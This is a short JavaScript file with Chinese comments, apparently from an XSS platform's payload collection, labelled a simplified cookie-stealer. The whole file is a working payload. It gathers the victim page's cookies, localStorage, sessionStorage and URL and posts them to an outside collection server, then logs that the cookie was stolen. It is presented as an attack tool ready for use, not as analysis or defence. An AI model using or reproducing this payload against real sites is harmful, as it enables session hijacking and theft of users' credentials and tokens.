// Cookie窃取V2 - 简化版 - 黑客仓库XSS平台
// 更简洁的Cookie窃取Payload，适合快速测试

(function() {
    'use strict';
    
    // 配置
    const API = 'https://xss.li/api/collect.php';
    
    // 收集所有Cookie和Storage
    const data = {
        type: 'cookie_v2',
        cookies: document.cookie,
        local: Object.keys(localStorage).reduce((obj, key) => {
            obj[key] = localStorage.getItem(key);
            return obj;
        }, {}),
        session: Object.keys(sessionStorage).reduce((obj, key) => {
            obj[key] = sessionStorage.getItem(key);
            return obj;
        }, {}),
        url: location.href,
        time: new Date().toISOString()
    };
    
    // 发送数据
    fetch(API, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(data)
    }).then(() => console.log('🍪 Cookie已窃取')).catch(e => console.log(e));
    
})();
